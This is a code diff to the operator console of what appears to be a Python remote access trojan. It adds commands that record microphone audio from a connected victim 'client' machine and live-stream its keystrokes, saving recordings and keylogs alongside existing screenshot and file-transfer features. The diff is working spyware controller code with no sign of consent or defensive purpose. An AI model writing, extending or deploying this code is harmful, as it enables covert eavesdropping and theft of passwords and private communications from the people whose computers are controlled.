@@ -32,6 +32,8 @@ if "--help" in sys.argv or "-h" in sys.argv:
  ------------------------------------------------------------------------------
  ADVANCED FEATURES:
    screenshot           -> Capture client screen (saves as .png)
+   microphone           -> Record microphone audio from client
+   keylog               -> Capture keystrokes from client
    download <path>      -> Download a file from client PC
    upload               -> Upload a file to client PC
    sysinfo              -> Get detailed JSON system information
@@ -112,6 +114,8 @@ def print_menu():
     print("")
     print("ADVANCED FEATURES:")
     print("  [screenshot] - Capture client screen and save")
+    print("  [microphone] - Record microphone audio from client")
+    print("  [keylog]     - Capture keystrokes from client")
     print("  [download]   - Download file from client")
     print("  [upload]     - Upload file to client")
     print("  [sysinfo]    - Get detailed system information")
@@ -266,6 +270,167 @@ def capture_screenshot():
     except Exception as e:
         print(f"❌ Error: {str(e)}\n")
         logging.error(f"Screenshot error: {e}")
+
+def capture_microphone():
+    """Capture microphone audio from client"""
+    if not active_client_id:
+        print("⚠️  No active client\n")
+        logging.warning("Microphone capture failed: No active client")
+        return
+
+    try:
+        with clients_lock:
+            if active_client_id not in clients:
+                print("⚠️  Client disconnected\n")
+                logging.error("Microphone failed: Client disconnected")
+                return
+            conn = clients[active_client_id]["conn"]
+            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
+
+        duration = 10
+        dur_input = input(f"Recording duration in seconds (default 10): ").strip()
+        if dur_input:
+            try:
+                duration = int(dur_input)
+                if duration < 1:
+                    duration = 10
+                elif duration > 60:
+                    print("⚠️  Max duration is 60 seconds\n")
+                    duration = 60
+            except ValueError:
+                print("⚠️  Invalid number, using 10 seconds\n")
+
+        print(f"🎤 Requesting audio recording ({duration}s)...")
+        logging.info(f"Requesting microphone audio ({duration}s) from {hostname}")
+
+        conn.send(f"MICROPHONE:{duration}".encode())
+
+        # Receive audio data with extended timeout
+        all_data = b""
+        conn.settimeout(duration + 10)
+
+        while True:
+            try:
+                chunk = conn.recv(BUFFER_SIZE)
+                if not chunk:
+                    break
+                all_data += chunk
+                if b'}' in chunk:
+                    break
+            except socket.timeout:
+                logging.warning("Microphone receive timeout")
+                break
+
+        if not all_data:
+            print("❌ No data received\n")
+            logging.error("Microphone failed: No data received")
+            return
+
+        response = json.loads(all_data.decode())
+
+        if response.get("status") == "success":
+            audio_data = base64.b64decode(response.get("data"))
+            actual_duration = response.get("duration", duration)
+
+            os.makedirs("recordings", exist_ok=True)
+            filename = f"recordings/audio_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
+
+            with open(filename, 'wb') as f:
+                f.write(audio_data)
+
+            size_mb = len(audio_data) / (1024 * 1024)
+            print(f"✓ Audio saved: {filename} ({size_mb:.2f}MB, {actual_duration}s)\n")
+            logging.info(f"Audio saved: {filename} ({size_mb:.2f}MB, {actual_duration}s)")
+        else:
+            error_msg = response.get('message', 'Unknown error')
+            print(f"❌ Microphone failed: {error_msg}\n")
+            logging.error(f"Microphone failed: {error_msg}")
+
+    except json.JSONDecodeError:
+        print(f"❌ Invalid response format\n")
+        logging.error("Microphone JSON decode error")
+    except Exception as e:
+        print(f"❌ Error: {str(e)}\n")
+        logging.error(f"Microphone error: {e}")
+
+def capture_keylog():
+    """Live-stream keystrokes from client — press Ctrl+C or Enter to stop."""
+    if not active_client_id:
+        print("⚠️  No active client\n")
+        logging.warning("Keylog stream failed: No active client")
+        return
+
+    try:
+        with clients_lock:
+            if active_client_id not in clients:
+                print("⚠️  Client disconnected\n")
+                logging.error("Keylog stream failed: Client disconnected")
+                return
+            conn = clients[active_client_id]["conn"]
+            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
+
+        print(f"⌨️ Live keylog stream from {hostname} — press Ctrl+C to stop\n")
+        conn.send(b"KEYLOG_START")
+
+        all_keys = []
+        stop_event = threading.Event()
+
+        def read_stream():
+            conn.settimeout(0.3)
+            buf = ""
+            while not stop_event.is_set():
+                try:
+                    chunk = conn.recv(4096).decode(errors="replace")
+                    if not chunk:
+                        break
+                    buf += chunk
+                    while "\n" in buf:
+                        line, buf = buf.split("\n", 1)
+                        line = line.strip()
+                        if line == "[KEYLOG_END]":
+                            stop_event.set()
+                            return
+                        if line.startswith("[KEYSTROKE]"):
+                            ts_key = line[len("[KEYSTROKE]"):].strip()
+                            all_keys.append(ts_key)
+                            print(f"\r  ⌨️  {ts_key}  \033[K", end="", flush=True)
+                except socket.timeout:
+                    continue
+                except (OSError, ConnectionError):
+                    break
+
+        reader = threading.Thread(target=read_stream, daemon=True)
+        reader.start()
+
+        try:
+            while not stop_event.is_set():
+                stop_event.wait(timeout=0.2)
+        except KeyboardInterrupt:
+            pass
+
+        stop_event.set()
+        conn.send(b"KEYLOG_STOP")
+        reader.join(timeout=3)
+
+        print()
+        if all_keys:
+            os.makedirs("keylogs", exist_ok=True)
+            filename = f"keylogs/keylog_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            key_data = "\n".join(all_keys)
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(f"Keylog Stream - {hostname}\n")
+                f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Keys captured: {len(all_keys)}\n")
+                f.write("="*50 + "\n\n")
+                f.write(key_data)
+            print(f"✓ Keylog saved: {filename} ({len(all_keys)} keys)\n")
+            logging.info(f"Keylog saved: {filename} ({len(all_keys)} keys)")
+        else:
+            print("⚠️  No keystrokes captured\n")
+
+    except Exception as e:
+        print(f"❌ Error: {str(e)}\n")
+        logging.error(f"Keylog stream error: {e}")
 
 def download_file():
     """Download file from client with progress tracking"""
@@ -603,6 +768,12 @@ while True:
             continue
         elif cmd == "screenshot":
             capture_screenshot()
+            continue
+        elif cmd == "microphone":
+            capture_microphone()
+            continue
+        elif cmd == "keylog":
+            capture_keylog()
             continue
         elif cmd == "download":
             download_file()
